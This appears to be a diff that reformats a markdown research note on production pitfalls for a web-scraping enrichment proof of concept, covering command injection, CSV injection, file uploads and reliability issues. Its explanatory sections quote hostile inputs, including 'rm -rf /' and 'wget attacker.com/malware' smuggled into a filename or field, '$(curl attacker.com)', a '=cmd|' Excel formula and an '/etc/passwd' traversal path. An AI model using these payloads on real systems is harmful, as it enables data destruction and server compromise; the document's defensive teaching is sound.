@@ -21,18 +21,21 @@ These mistakes cause rewrites, security incidents, or major production issues.
 Web scraping 10-20 companies synchronously in a single HTTP request causes browser/server timeouts. Users see "504 Gateway Timeout" or frozen UI, jobs partially complete with no visibility into progress.
 
 **Why it happens:**
+
 - Web scraping is I/O-bound and slow (rate limiting delays compound)
 - HTTP request timeouts (typical: 30-120 seconds) < actual job time
 - PoC developers think "it only takes 2 minutes" without accounting for variance
 - Synchronous operations in Python frameworks have 2-15 minute hard limits
 
 **Consequences:**
+
 - Users lose work (no results returned after timeout)
 - Cannot process larger batches without complete rewrite
 - Server resources locked during long operations
 - No way to show progress or cancel jobs
 
 **Prevention:**
+
 1. **Never run scraping in the request handler** - even for small batches
 2. **Move to async task queue immediately** (even in PoC phase):
    - Minimal: Store job state in JSON file, poll endpoint for status
@@ -48,16 +51,19 @@ Web scraping 10-20 companies synchronously in a single HTTP request causes brows
 5. **Return response immediately** with job tracking URL
 
 **Detection:**
+
 - Request takes >30 seconds locally
 - Browser shows "waiting for response" spinner indefinitely
 - Nginx/Apache logs show increasing request durations
 - Users report "nothing happens after upload"
 
 **Phase assignment:**
+
 - Phase 1 (MVP): Implement basic async pattern with JSON state file
 - Phase 2: Add proper task queue and progress tracking
 
 **Sources:**
+
 - [Synchronous vs Asynchronous Requests - MDN](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest_API/Synchronous_and_Asynchronous_Requests)
 - [Backend and Frontend Timeouts - Medium](https://medium.com/@ritikasharma.sharma97/backend-and-frontend-timeouts-what-you-need-to-know-b95d2a7b6f6d)
 - [Asynchronous Processing Guide - Salesforce](https://architect.salesforce.com/decision-guides/async-processing)
@@ -70,20 +76,24 @@ Web scraping 10-20 companies synchronously in a single HTTP request causes brows
 Calling existing Python scripts via `subprocess.run(f"python script.py {user_input}", shell=True)` enables command injection attacks. Attacker uploads CSV with filename `data.csv; rm -rf /` or company name `"; wget attacker.com/malware; #"`.
 
 **Why it happens:**
+
 - Wrapping existing CLI scripts feels like the "quick" path
 - Developers don't realize `shell=True` interprets metacharacters (; && | ` $())
 - Input validation seems "good enough" for PoC
 - "We don't have auth, so nobody will attack us" mindset
 
 **Consequences:**
+
 - Remote code execution (RCE) - attacker can run arbitrary commands
 - Data exfiltration, server compromise, ransomware deployment
 - Classified as CWE-78: Critical severity vulnerability
 - Immediate CVE if discovered, potential regulatory violations
 
 **Prevention:**
+
 1. **NEVER use `shell=True` with any user-controlled input**
 2. **Pass commands as list, not string**:
+
    ```python
    # DANGEROUS
    subprocess.run(f"python script.py --file {filename}", shell=True)
@@ -91,6 +101,7 @@ Calling existing Python scripts via `subprocess.run(f"python script.py {user_inp
    # SAFE
    subprocess.run(["python", "script.py", "--file", filename], shell=False, timeout=300)
    ```
+
 3. **Whitelist input validation**:
    - File uploads: Check extension AND content type AND scan first 512 bytes
    - Company names: Regex validation `^[A-Za-z0-9\s\-åäöÅÄÖ]+$` for Swedish characters
@@ -108,16 +119,19 @@ Calling existing Python scripts via `subprocess.run(f"python script.py {user_inp
    - Drop privileges before execution
 
 **Detection:**
+
 - `grep "shell=True" *.py` finds vulnerable patterns
 - Security scanners (Bandit, Semgrep) flag subprocess issues
 - Code review: Any string concatenation near subprocess calls
 - Penetration testing with payloads: `test; whoami`, `$(curl attacker.com)`
 
 **Phase assignment:**
+
 - Phase 0 (Pre-PoC): Refactor scripts to be importable modules OR secure subprocess calls
 - All phases: Input validation at API boundary
 
 **Sources:**
+
 - [Python Subprocess Security - Codiga](https://www.codiga.io/blog/python-subprocess-security/)
 - [Command Injection in Python - Snyk](https://snyk.io/blog/command-injection-python-prevention-examples/)
 - [Use Subprocess Securely - OpenStack Security](https://security.openstack.org/guidelines/dg_use-subprocess-securely.html)
@@ -131,18 +145,21 @@ Calling existing Python scripts via `subprocess.run(f"python script.py {user_inp
 If using Selenium/Playwright for scraping, failing to properly close browser contexts causes memory to grow indefinitely. Server runs out of RAM after 50-100 jobs, crashes, requires manual restart.
 
 **Why it happens:**
+
 - Browser automation creates heavy objects (browser instances, contexts, pages)
 - Exception during scraping exits handler before cleanup code runs
 - "It works on my laptop" (8 jobs) doesn't show leak (appears at 50+)
 - Creating new browser context per page is common beginner pattern
 
 **Consequences:**
+
 - Server OOM (Out of Memory) kills
 - Degraded performance as swap fills
 - Jobs fail randomly when memory exhausted
 - Production downtime, angry users, manual intervention required
 
 **Prevention:**
+
 1. **Always use context managers**:
    ```python
    async with async_playwright() as p:
@@ -174,17 +191,20 @@ If using Selenium/Playwright for scraping, failing to properly close browser con
    ```
 
 **Detection:**
+
 - `ps aux | grep python` shows growing memory (RES column)
 - Application logs show successful jobs but memory doesn't drop
 - Server becomes unresponsive after running for hours
 - Monitoring tools (Datadog, Sentry) show memory trending upward
 
 **Phase assignment:**
+
 - Phase 1 (MVP): Proper context managers and resource cleanup
 - Phase 2: Memory monitoring and automatic restart policies
 - Phase 3: Kubernetes resource limits and horizontal scaling
 
 **Sources:**
+
 - [Memory Leak: How to Find, Fix & Prevent - Browserless](https://www.browserless.io/blog/memory-leak-how-to-find-fix-prevent-them)
 - [Finding Memory Leaks in Web Apps - GitHub/Fuite](https://github.com/nolanlawson/fuite)
 - [Memory Leaks in Web Applications - Sematext](https://sematext.com/blog/web-application-memory-leaks/)
@@ -197,12 +217,14 @@ If using Selenium/Playwright for scraping, failing to properly close browser con
 Scraping logic works fine for 5 companies in testing, but processing 20 companies in production triggers rate limits. All 20 jobs fail with HTTP 429 errors, IP gets banned, no results returned. Retry logic makes it worse by hammering the endpoint.
 
 **Why it happens:**
+
 - Rate limits are per-minute/per-hour, small batches don't trigger them
 - No exponential backoff in retry logic
 - Each company scrapes multiple pages (10 companies × 5 pages = 50 requests)
 - Concurrent processing multiplies request rate
 
 **Consequences:**
+
 - IP address banned (can last hours to days)
 - Zero data enrichment while banned
 - Retry storms make ban permanent
@@ -210,6 +232,7 @@ Scraping logic works fine for 5 companies in testing, but processing 20 companie
 - Users blame your service, not the upstream
 
 **Prevention:**
+
 1. **Respect Retry-After headers**:
    ```python
    if response.status_code == 429:
@@ -238,17 +261,20 @@ Scraping logic works fine for 5 companies in testing, but processing 20 companie
    - Store partial results to resume failed jobs
 
 **Detection:**
+
 - HTTP 429 errors in logs
 - Sudden spike in failed jobs after batch increase
 - Response headers showing `X-RateLimit-Remaining: 0`
 - Scraping that worked yesterday fails today at scale
 
 **Phase assignment:**
+
 - Phase 1 (MVP): Basic exponential backoff and Retry-After handling
 - Phase 2: Request rate monitoring and throttling
 - Phase 3: Distributed rate limiting for multi-worker setups
 
 **Sources:**
+
 - [Rate Limit in Web Scraping - Scrape.do](https://scrape.do/blog/web-scraping-rate-limit/)
 - [Bypass Rate Limit While Web Scraping - ZenRows](https://www.zenrows.com/blog/web-scraping-rate-limit)
 - [Dealing with Rate Limiting Using Exponential Backoff](https://substack.thewebscraping.club/p/rate-limit-scraping-exponential-backoff)
@@ -266,18 +292,21 @@ These cause delays, technical debt, or operational pain but don't require full r
 User uploads CSV with company data. Malicious cell contains `=cmd|'/c calc'!A1` (Excel formula). When enriched results are downloaded and opened in Excel, formula executes arbitrary commands.
 
 **Why it happens:**
+
 - CSV files are trusted as "just data"
 - Excel interprets cells starting with `=`, `+`, `-`, `@` as formulas
 - Web app passes through user content without sanitization
 - Testing uses clean data, doesn't check for injection payloads
 
 **Consequences:**
+
 - Code execution on user's machine (when they open results in Excel)
 - Data exfiltration via web requests in formulas
 - Reputational damage if exploited
 - Regulatory compliance violations (GDPR, etc.)
 
 **Prevention:**
+
 1. **Sanitize CSV output** - prefix dangerous characters:
    ```python
    def sanitize_csv_cell(value):
@@ -296,15 +325,18 @@ User uploads CSV with company data. Malicious cell contains `=cmd|'/c calc'!A1` 
 5. **Content Security Policy** for web-based preview
 
 **Detection:**
+
 - Security scanner (OWASP ZAP) with CSV injection checks
 - Manual testing: Upload CSV with `=1+1` and check if preserved in output
 - Code review: Search for unescaped CSV writing
 
 **Phase assignment:**
+
 - Phase 1 (MVP): Input/output sanitization
 - Phase 2: Automated security testing in CI/CD
 
 **Sources:**
+
 - [File Upload Vulnerabilities - OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types)
 - [CSV Injection Attacks - Cobalt](https://www.cobalt.io/blog/file-upload-vulnerabilities)
 - [File Upload Cheat Sheet - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
@@ -317,19 +349,23 @@ User uploads CSV with company data. Malicious cell contains `=cmd|'/c calc'!A1` 
 Job state stored in global variables or class attributes. Concurrent requests overwrite each other's state. User A's job shows User B's companies, or results get mixed between batches.
 
 **Why it happens:**
+
 - "No auth" = developers assume single user
 - CLI script uses global state, web wrapper inherits pattern
 - Flask/FastAPI tutorials use simple examples without concurrency
 - Threading model not understood (workers share memory)
 
 **Consequences:**
+
 - Data leakage between jobs/users
 - Incorrect results returned
 - Race conditions cause random failures
 - Cannot scale to multiple workers
 
 **Prevention:**
+
 1. **Never use global state for job data**:
+
    ```python
    # BAD - Global state
    current_job_data = {}
@@ -339,6 +375,7 @@ Job state stored in global variables or class attributes. Concurrent requests ov
        job_state = load_job_state(job_id)
        # Process using job_state
    ```
+
 2. **Store job state externally**:
    - File system: `jobs/{job_id}.json`
    - Redis: `SET job:{job_id} {json_data}`
@@ -357,17 +394,20 @@ Job state stored in global variables or class attributes. Concurrent requests ov
 5. **Make functions pure/stateless** where possible
 
 **Detection:**
+
 - Results contain data from wrong job
 - `pytest` with `pytest-xdist` (parallel tests) fails randomly
 - Logs show interleaved job processing with wrong data
 - Load testing reveals race conditions
 
 **Phase assignment:**
+
 - Phase 1 (MVP): External state storage (JSON files minimum)
 - Phase 2: Redis or database-backed state management
 - Phase 3: Distributed state for multi-server deployment
 
 **Sources:**
+
 - [Broken Session Management - SecureFlag](https://knowledge-base.secureflag.com/vulnerabilities/broken_authentication/broken_session_management_vulnerability.html)
 - [State Management Mistakes - Medium](https://medium.com/@divyanshbarar/3-big-mistakes-to-avoid-while-state-management-87daa072ee76)
 - [State Management in 2026 - Nucamp](https://www.nucamp.co/blog/state-management-in-2026-redux-context-api-and-modern-patterns)
@@ -380,19 +420,23 @@ Job state stored in global variables or class attributes. Concurrent requests ov
 PoC has no structured logging. Production issues manifest as "it stopped working." No visibility into which company failed, what error occurred, or how to reproduce. Debugging requires adding print statements and redeploying.
 
 **Why it happens:**
+
 - PoC uses `print()` statements for debugging
 - "We'll add logging later" mentality
 - Unclear what to log vs what's noise
 - No log aggregation strategy
 
 **Consequences:**
+
 - Hours spent debugging issues that happened hours ago
 - Cannot diagnose production problems without reproducing
 - No audit trail for compliance
 - User reports issues you can't verify or fix
 
 **Prevention:**
+
 1. **Use structured logging from day 1**:
+
    ```python
    import structlog
    logger = structlog.get_logger()
@@ -402,6 +446,7 @@ PoC has no structured logging. Production issues manifest as "it stopped working
                company_count=len(companies),
                user_id=user_id)
    ```
+
 2. **Log critical decision points**:
    - Job start/complete with timing
    - Each company processed (success/failure)
@@ -433,17 +478,20 @@ PoC has no structured logging. Production issues manifest as "it stopped working
    ```
 
 **Detection:**
+
 - Production issue occurs, no way to diagnose
 - Logs filled with print statements and debug messages
 - Cannot answer "what failed for this job?"
 - Log files exceed 1GB (too much noise)
 
 **Phase assignment:**
+
 - Phase 1 (MVP): Structured logging setup with job_id correlation
 - Phase 2: Log aggregation (ELK, Datadog, CloudWatch)
 - Phase 3: Alerting and dashboards
 
 **Sources:**
+
 - [Production Logs Forced API Error Handling Simplification - DEV](https://dev.to/rohit_gavali_0c2ad84fe4e0/how-production-logs-forced-me-to-simplify-api-error-handling-388f)
 - [Python Logging Module Complete Guide - Dash0](https://www.dash0.com/guides/logging-in-python)
 - [Log Levels Explained - Better Stack](https://betterstack.com/community/guides/logging/log-levels-explained/)
@@ -457,19 +505,23 @@ PoC has no structured logging. Production issues manifest as "it stopped working
 App expects CSV upload, validates by `.csv` extension. User uploads `.csv.exe` or ZIP file renamed to `.csv`. Server tries to parse as CSV, crashes or executes malicious code.
 
 **Why it happens:**
+
 - Only checking file extension (client-controlled)
 - Not validating file content/magic bytes
 - Trusting user-provided MIME types
 - "We only use it internally" mentality
 
 **Consequences:**
+
 - Arbitrary file upload leading to stored XSS or RCE
 - Denial of service from malformed files
 - Disk filling attack (upload huge files)
 - Server compromise if files executed
 
 **Prevention:**
+
 1. **Validate file content, not just extension**:
+
    ```python
    import magic
 
@@ -486,6 +538,7 @@ App expects CSV upload, validates by `.csv` extension. User uploads `.csv.exe` o
        except csv.Error:
            raise ValueError("Invalid CSV format")
    ```
+
 2. **Enforce size limits**:
    ```python
    MAX_UPLOAD_SIZE = 10 * 1024 * 1024  # 10MB
@@ -493,6 +546,7 @@ App expects CSV upload, validates by `.csv` extension. User uploads `.csv.exe` o
        raise ValueError("File too large")
    ```
 3. **Sanitize filenames**:
+
    ```python
    import re
    from pathlib import Path
@@ -505,22 +559,26 @@ App expects CSV upload, validates by `.csv` extension. User uploads `.csv.exe` o
        # Generate unique name
        return f"{uuid.uuid4()}_{filename}"
    ```
+
 4. **Store uploads outside webroot** (prevent direct access)
 5. **Run virus scanning** if handling external uploads
 6. **Set upload directory permissions** (no execute)
 
 **Detection:**
+
 - Upload files with wrong extensions (`.exe`, `.php`, `.jsp`)
 - Upload huge files (test size limit)
 - Upload files with path traversal (`../../etc/passwd.csv`)
 - Security scanner (Burp Suite) file upload tests
 
 **Phase assignment:**
+
 - Phase 1 (MVP): Content validation and size limits
 - Phase 2: Virus scanning and secure storage
 - Phase 3: Content Security Policy and sandboxed preview
 
 **Sources:**
+
 - [File Upload Vulnerabilities - PortSwigger](https://portswigger.net/web-security/file-upload)
 - [Unrestricted File Upload - OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
 - [File Upload Security - OPSWAT](https://www.opswat.com/solutions/application-security/file-upload-security)
@@ -537,19 +595,23 @@ Common mistakes that cause annoyance but are easily fixable.
 PoC starts as "simple web UI for 20 companies." Stakeholders request user management, scheduling, email notifications, historical tracking. PoC takes 3 months instead of 2 weeks, never launches.
 
 **Why it happens:**
+
 - No clear success criteria defined upfront
 - Stakeholders see UI, imagine features
 - Developer wants to impress with polish
 - "While we're at it" mindset
 
 **Consequences:**
+
 - PoC timeline explodes
 - Core functionality delayed
 - Team burnout
 - Value never delivered
 
 **Prevention:**
+
 1. **Define PoC scope in writing BEFORE coding**:
+
    ```
    IN SCOPE:
    - Upload CSV with 20 companies
@@ -562,22 +624,26 @@ PoC starts as "simple web UI for 20 companies." Stakeholders request user manage
    - Scheduling
    - Email notifications
    ```
+
 2. **Set feature freeze date**: "No new features after Friday"
 3. **Use "PoC backlog"** for future ideas (don't say no, say "after PoC")
 4. **Time-box PoC**: "We launch in 2 weeks with what we have"
 5. **Focus on core value proposition**: Prove enrichment works, not build full product
 
 **Detection:**
+
 - PoC timeline keeps extending
 - New features added every meeting
 - Core functionality still not working
 - Team discussing authentication systems
 
 **Phase assignment:**
+
 - Phase 0 (Pre-PoC): Document scope boundaries
 - All phases: Maintain "next phase" backlog for deferred features
 
 **Sources:**
+
 - [Common PoC Pitfalls - Success Platform](https://www.success.app/blog/common-poc-pitfalls/)
 - [Proof of Concept in Software - Netguru](https://www.netguru.com/blog/proof-of-concept-in-software-development)
 
@@ -589,19 +655,23 @@ PoC starts as "simple web UI for 20 companies." Stakeholders request user manage
 PoC finishes, but unclear if it "succeeded." Stakeholders have different opinions on next steps. Project stalls in "let's add one more thing" limbo.
 
 **Why it happens:**
+
 - Success metrics not defined upfront
 - "Let's build it and see" approach
 - Confusing PoC goals with product goals
 - No decision-maker empowered
 
 **Consequences:**
+
 - Cannot determine if PoC validates hypothesis
 - Endless tweaking instead of deciding
 - Team morale drops (unclear if work matters)
 - PoC becomes zombie project
 
 **Prevention:**
+
 1. **Define success criteria before building**:
+
    ```
    PoC succeeds if:
    - Can enrich 20 companies in <5 minutes
@@ -612,21 +682,25 @@ PoC finishes, but unclear if it "succeeded." Stakeholders have different opinion
    Decision point: If success → build Phase 2
    If failure → pivot to different approach
    ```
+
 2. **Quantify metrics**: Not "fast enough" but "under 5 minutes"
 3. **Include go/no-go decision process**: Who decides and when
 4. **Test with real data**: Not just happy-path examples
 5. **Set decision deadline**: "We decide on launch by March 1"
 
 **Detection:**
+
 - PoC demo meets, no decision made
 - "Let's add just one more feature" repeated
 - Unclear what success looks like
 - Different stakeholders have different expectations
 
 **Phase assignment:**
+
 - Phase 0 (Pre-PoC): Document success criteria and decision process
 
 **Sources:**
+
 - [Common PoC Pitfalls - Success Platform](https://www.success.app/blog/common-poc-pitfalls/)
 - [PoC in Software Development - Designveloper](https://www.designveloper.com/blog/poc-in-software/)
 
@@ -638,22 +712,26 @@ PoC finishes, but unclear if it "succeeded." Stakeholders have different opinion
 Developer uses Python threading for web scraping, expecting parallelism. Global Interpreter Lock (GIL) prevents true parallelism. Performance gains minimal or negative due to thread overhead.
 
 **Why it happens:**
+
 - Misunderstanding GIL behavior
 - "Threading = parallel" assumption from other languages
 - Not distinguishing CPU-bound vs I/O-bound tasks
 - Copy-paste threading examples without understanding
 
 **Consequences:**
+
 - Expected 5x speedup, got 1.1x
 - Added complexity with little benefit
 - Race conditions introduced for no gain
 - Harder to debug than async code
 
 **Prevention:**
+
 1. **Understand I/O-bound vs CPU-bound**:
    - Web scraping = I/O-bound → Use `asyncio` or `threading`
    - Data processing = CPU-bound → Use `multiprocessing`
 2. **For web scraping, prefer `asyncio`**:
+
    ```python
    import asyncio
    import httpx
@@ -667,29 +745,35 @@ Developer uses Python threading for web scraping, expecting parallelism. Global 
            tasks = [scrape_company(client, c) for c in companies]
            results = await asyncio.gather(*tasks)
    ```
+
 3. **Threading is okay for I/O** (GIL released during I/O):
+
    ```python
    from concurrent.futures import ThreadPoolExecutor
 
    with ThreadPoolExecutor(max_workers=5) as executor:
        results = list(executor.map(scrape_company, companies))
    ```
+
 4. **Avoid threading for CPU-heavy parsing** - use `multiprocessing`
 5. **Framework matters**:
    - FastAPI: Native async support
    - Flask: Threading or external task queue
 
 **Detection:**
+
 - Threading code doesn't speed up processing
 - CPU profiling shows threads waiting on GIL
 - Async code outperforms threading significantly
 - Unexplained race conditions
 
 **Phase assignment:**
+
 - Phase 1 (MVP): Choose async (FastAPI) or threading (Flask) consistently
 - Phase 2: Optimize with profiling data
 
 **Sources:**
+
 - [Python Web Scraping Concurrency - ZenRows](https://www.zenrows.com/blog/speed-up-web-scraping-with-concurrency-in-python)
 - [FastAPI vs Flask Concurrency - Developers Voice](https://developersvoice.com/blog/python/fastapi_django_flask_architecture_guide/)
 - [FastAPI Async Documentation](https://fastapi.tiangolo.com/async/)
@@ -702,19 +786,23 @@ Developer uses Python threading for web scraping, expecting parallelism. Global 
 Script paths, rate limits, API keys hardcoded in source code. Changing batch size requires code change and redeploy. Cannot test against staging environment without editing code.
 
 **Why it happens:**
+
 - PoC prioritizes speed over flexibility
 - "We'll externalize config later"
 - Unclear what should be configurable
 - Not thinking about different environments
 
 **Consequences:**
+
 - Cannot deploy to different environments
 - Secrets leaked in Git history
 - Testing requires code changes
 - Cannot adjust without redeploy
 
 **Prevention:**
+
 1. **Use environment variables**:
+
    ```python
    import os
 
@@ -722,7 +810,9 @@ Script paths, rate limits, API keys hardcoded in source code. Changing batch siz
    MAX_WORKERS = int(os.getenv("MAX_WORKERS", "2"))
    SCRIPT_PATH = os.getenv("SCRIPT_PATH", "./enrichment_scripts")
    ```
+
 2. **Config file for complex settings**:
+
    ```python
    # config.yaml
    scraping:
@@ -735,6 +825,7 @@ Script paths, rate limits, API keys hardcoded in source code. Changing batch siz
    with open("config.yaml") as f:
        config = yaml.safe_load(f)
    ```
+
 3. **Never commit secrets**:
    - Use `.env` file (add to `.gitignore`)
    - Use environment variables in production
@@ -749,11 +840,13 @@ Script paths, rate limits, API keys hardcoded in source code. Changing batch siz
 5. **Document configuration options** in README
 
 **Detection:**
+
 - `grep -r "api_key =" *.py` finds hardcoded values
 - Cannot deploy to staging without code change
 - Secrets visible in Git history (`git log -p | grep -i password`)
 
 **Phase assignment:**
+
 - Phase 1 (MVP): Environment variables for all config
 - Phase 2: Secrets manager integration
 
@@ -761,17 +854,17 @@ Script paths, rate limits, API keys hardcoded in source code. Changing batch siz
 
 ## Phase-Specific Warnings
 
-| Phase | Topic | Likely Pitfall | Mitigation |
-|-------|-------|---------------|------------|
-| Pre-PoC | Script Refactoring | Subprocess security hole (Pitfall #2) | Refactor scripts to be importable modules |
-| Phase 1 (MVP) | Async Processing | Synchronous timeout (Pitfall #1) | Implement async job pattern from day 1 |
-| Phase 1 (MVP) | Input Validation | CSV injection (Pitfall #5), File upload bypass (Pitfall #8) | Whitelist validation, content checking |
-| Phase 1 (MVP) | State Management | Global state race conditions (Pitfall #6) | External state storage (JSON/Redis) |
-| Phase 1 (MVP) | Logging | Production blindness (Pitfall #7) | Structured logging with correlation IDs |
-| Phase 2 | Scaling | Memory leaks (Pitfall #3) | Proper resource cleanup, monitoring |
-| Phase 2 | Rate Limiting | Cascade failures (Pitfall #4) | Exponential backoff, request throttling |
-| Phase 3 | Multi-worker | Distributed state consistency | Redis/database state, not files |
-| Phase 3 | Production | Missing monitoring/alerting | APM tools, error tracking, dashboards |
+| Phase         | Topic              | Likely Pitfall                                              | Mitigation                                |
+| ------------- | ------------------ | ----------------------------------------------------------- | ----------------------------------------- |
+| Pre-PoC       | Script Refactoring | Subprocess security hole (Pitfall #2)                       | Refactor scripts to be importable modules |
+| Phase 1 (MVP) | Async Processing   | Synchronous timeout (Pitfall #1)                            | Implement async job pattern from day 1    |
+| Phase 1 (MVP) | Input Validation   | CSV injection (Pitfall #5), File upload bypass (Pitfall #8) | Whitelist validation, content checking    |
+| Phase 1 (MVP) | State Management   | Global state race conditions (Pitfall #6)                   | External state storage (JSON/Redis)       |
+| Phase 1 (MVP) | Logging            | Production blindness (Pitfall #7)                           | Structured logging with correlation IDs   |
+| Phase 2       | Scaling            | Memory leaks (Pitfall #3)                                   | Proper resource cleanup, monitoring       |
+| Phase 2       | Rate Limiting      | Cascade failures (Pitfall #4)                               | Exponential backoff, request throttling   |
+| Phase 3       | Multi-worker       | Distributed state consistency                               | Redis/database state, not files           |
+| Phase 3       | Production         | Missing monitoring/alerting                                 | APM tools, error tracking, dashboards     |
 
 ---
 
@@ -781,18 +874,18 @@ Script paths, rate limits, API keys hardcoded in source code. Changing batch siz
 
 ### What Changes from PoC to Production
 
-| Aspect | PoC | Production |
-|--------|-----|------------|
-| Error handling | `try/except: pass` | Structured errors, retries, alerting |
-| Logging | `print()` | Structured logs, correlation IDs, aggregation |
-| Validation | Basic type checks | Whitelist validation, sanitization, security scanning |
-| State | Global variables | External storage (Redis/DB) |
-| Processing | Synchronous | Async task queue |
-| Configuration | Hardcoded | Environment-based, secrets manager |
-| Testing | Manual happy path | Automated tests, load testing, security testing |
-| Monitoring | None | APM, error tracking, dashboards, alerts |
-| Deployment | `python app.py` | Containerized, orchestrated, auto-scaling |
-| Documentation | None | API docs, runbooks, architecture diagrams |
+| Aspect         | PoC                | Production                                            |
+| -------------- | ------------------ | ----------------------------------------------------- |
+| Error handling | `try/except: pass` | Structured errors, retries, alerting                  |
+| Logging        | `print()`          | Structured logs, correlation IDs, aggregation         |
+| Validation     | Basic type checks  | Whitelist validation, sanitization, security scanning |
+| State          | Global variables   | External storage (Redis/DB)                           |
+| Processing     | Synchronous        | Async task queue                                      |
+| Configuration  | Hardcoded          | Environment-based, secrets manager                    |
+| Testing        | Manual happy path  | Automated tests, load testing, security testing       |
+| Monitoring     | None               | APM, error tracking, dashboards, alerts               |
+| Deployment     | `python app.py`    | Containerized, orchestrated, auto-scaling             |
+| Documentation  | None               | API docs, runbooks, architecture diagrams             |
 
 ### The "Works on My Machine" Checklist
 
@@ -811,18 +904,18 @@ Before calling PoC "production-ready," verify:
 
 ## Research Confidence Assessment
 
-| Topic | Confidence | Sources |
-|-------|-----------|---------|
-| Synchronous processing timeouts | HIGH | MDN, Medium (3 sources), verified 2026 |
-| Subprocess security | HIGH | Snyk, OpenStack, Semgrep (official docs) |
-| Memory leaks | HIGH | Browserless, GitHub/Fuite (tools), Sematext |
-| Rate limiting | HIGH | ZenRows, Scrape.do, The Web Scraping Club (4 sources) |
-| CSV injection | HIGH | OWASP, Cobalt (security authorities) |
-| State management | MEDIUM | Multiple sources but less domain-specific |
-| Logging | HIGH | Multiple 2025-2026 sources, production context |
-| File upload security | HIGH | OWASP, PortSwigger (security standards) |
-| PoC scope creep | MEDIUM | General PoC guidance, not specific to data enrichment |
-| GIL/concurrency | HIGH | Official FastAPI docs, ZenRows (2026) |
+| Topic                           | Confidence | Sources                                               |
+| ------------------------------- | ---------- | ----------------------------------------------------- |
+| Synchronous processing timeouts | HIGH       | MDN, Medium (3 sources), verified 2026                |
+| Subprocess security             | HIGH       | Snyk, OpenStack, Semgrep (official docs)              |
+| Memory leaks                    | HIGH       | Browserless, GitHub/Fuite (tools), Sematext           |
+| Rate limiting                   | HIGH       | ZenRows, Scrape.do, The Web Scraping Club (4 sources) |
+| CSV injection                   | HIGH       | OWASP, Cobalt (security authorities)                  |
+| State management                | MEDIUM     | Multiple sources but less domain-specific             |
+| Logging                         | HIGH       | Multiple 2025-2026 sources, production context        |
+| File upload security            | HIGH       | OWASP, PortSwigger (security standards)               |
+| PoC scope creep                 | MEDIUM     | General PoC guidance, not specific to data enrichment |
+| GIL/concurrency                 | HIGH       | Official FastAPI docs, ZenRows (2026)                 |
 
 ---
 
